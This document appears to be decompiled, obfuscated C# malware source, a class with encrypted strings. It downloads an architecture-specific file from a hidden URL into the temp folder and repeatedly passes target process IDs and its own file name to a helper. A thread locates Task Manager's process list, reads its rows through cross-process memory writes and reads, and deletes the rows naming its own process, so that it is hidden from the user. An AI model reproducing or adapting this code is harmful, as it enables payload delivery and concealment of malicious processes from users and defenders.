using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace xNvWsvlcqg;

internal sealed class zsFaIoMVliP
{
	private struct EzIueWVIjUgq
	{
		public uint jJkGPIOzlfMzIyX;

		public IntPtr mlazFqHKfb;

		public IntPtr jGsBHrveuzENmGoP;

		public uint TYoyghAnuw;

		public uint GrnURaPMDaEEwp;

		public IntPtr eIzlGhgqkWlpHm;

		public uint FmidfeXfHRRDKOK;

		public int jiqoaEDKcC;

		public IntPtr CJVnLSbRNtyF;
	}

	private static volatile bool FyGEatRAdXiXA;

	public static volatile bool UdFZbkkNEgyTcR;

	[NonSerialized]
	internal static GetString getString_0;

	public static string XwhfXRYjpMt()
	{
		if (IntPtr.Size == 8)
		{
			BhIlEyPUpxxiJj.btYscLoKoBkwj = PjGrvDxzsyJjn(new Uri(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365234))));
		}
		else
		{
			BhIlEyPUpxxiJj.btYscLoKoBkwj = PjGrvDxzsyJjn(new Uri(BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365056))));
		}
		return BhIlEyPUpxxiJj.btYscLoKoBkwj;
	}

	public static string PjGrvDxzsyJjn(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107368379), getString_0(107359013)).Remove(0, 3) + getString_0(107368406);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process nfDwnzVXvgvy(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void KEkMRUCKsOfx(string[] string_0)
	{
		string text = XwhfXRYjpMt();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = nfDwnzVXvgvy(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					BhIlEyPUpxxiJj.etzKuRpsiGLAb(text, text2 + getString_0(107357414) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					BhIlEyPUpxxiJj.etzKuRpsiGLAb(text, text2 + getString_0(107357414) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107365454));
					BhIlEyPUpxxiJj.etzKuRpsiGLAb(text, text2 + getString_0(107357414) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365413)));
					BhIlEyPUpxxiJj.etzKuRpsiGLAb(text, text2 + getString_0(107357414) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107357440)));
					BhIlEyPUpxxiJj.etzKuRpsiGLAb(text, text2 + getString_0(107357414) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365420)));
					BhIlEyPUpxxiJj.etzKuRpsiGLAb(text, text2 + getString_0(107357414) + BhIlEyPUpxxiJj.SrfpFCmHOqUxNO(getString_0(107365371)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr zczuufFUdWggO);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr mHurTSoBuqNN, IntPtr vOMmTeFqITin, byte[] MSJzAkBlynff, uint jxTfDkjXoCxY, out UIntPtr wqlnrawNHY);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr VTMFhVkzLHRKJ, IntPtr zEWlFoNjHu, [Out] byte[] AcCzFOrATgPdkC, int wAlubvLcahTrw, out UIntPtr itUWjQSYHqUa);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr qnQibVybTGw, out uint zODIALMOcHdTxb);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] uSFLyBIEpIMfw(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr EXjMpaACYkxIT(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void RwNKuCVpDvcJyPM(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr DNVyawNOpCAbJEXg(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void HWTMcBPHhQcvQF(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr EHTRgJVcYf()
	{
		IntPtr intPtr = FindWindow(getString_0(107365386), getString_0(107365361));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107365328), getString_0(107364775));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107365328), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107364790), getString_0(107364737));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107365328), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107364790), getString_0(107364756));
	}

	private static IntPtr VasufPUGMR(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void ihUYAePpuBDbY(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void gUYlyokLoRDBG(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string iGYfILWWRYum(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		EzIueWVIjUgq ezIueWVIjUgq = default(EzIueWVIjUgq);
		GetWindowThreadProcessId(intptr_0, out var zODIALMOcHdTxb);
		IntPtr intPtr = EXjMpaACYkxIT(zODIALMOcHdTxb);
		IntPtr intPtr2 = DNVyawNOpCAbJEXg((uint)Marshal.SizeOf(ezIueWVIjUgq), intPtr);
		IntPtr intPtr3 = DNVyawNOpCAbJEXg(50u, intPtr);
		ezIueWVIjUgq.mlazFqHKfb = intptr_1;
		ezIueWVIjUgq.jGsBHrveuzENmGoP = (IntPtr)0;
		ezIueWVIjUgq.FmidfeXfHRRDKOK = 50u;
		ezIueWVIjUgq.eIzlGhgqkWlpHm = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, uSFLyBIEpIMfw(ezIueWVIjUgq), (uint)Marshal.SizeOf(ezIueWVIjUgq), out var wqlnrawNHY);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out wqlnrawNHY);
		HWTMcBPHhQcvQF(intPtr, intPtr2, (uint)Marshal.SizeOf(ezIueWVIjUgq));
		HWTMcBPHhQcvQF(intPtr, intPtr3, 50u);
		RwNKuCVpDvcJyPM(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void EYmMvokBWLkR(string string_0)
	{
		IntPtr intPtr = EHTRgJVcYf();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)VasufPUGMR(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = iGYfILWWRYum(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				ihUYAePpuBDbY(intPtr, (IntPtr)i);
			}
		}
	}

	private static void FTwBpNsscfU()
	{
		IntPtr intPtr = EHTRgJVcYf();
		if (intPtr != IntPtr.Zero)
		{
			gUYlyokLoRDBG(intPtr);
			gUYlyokLoRDBG(intPtr);
			gUYlyokLoRDBG(intPtr);
			gUYlyokLoRDBG(intPtr);
			gUYlyokLoRDBG(intPtr);
		}
	}

	public static void IxfTtQcnOtTnt()
	{
		Thread thread = new Thread(VSqsKRNiaqLs);
		thread.Start();
	}

	private static void VSqsKRNiaqLs()
	{
		while (!FyGEatRAdXiXA)
		{
			if (UdFZbkkNEgyTcR)
			{
				EYmMvokBWLkR(Process.GetCurrentProcess().ProcessName + getString_0(107368406));
				Thread.Sleep(525);
			}
			else
			{
				FTwBpNsscfU();
				Thread.Sleep(1000);
			}
		}
		FyGEatRAdXiXA = false;
	}

	static zsFaIoMVliP()
	{
		Strings.CreateGetStringDelegate(typeof(zsFaIoMVliP));
		FyGEatRAdXiXA = false;
		UdFZbkkNEgyTcR = true;
	}
}
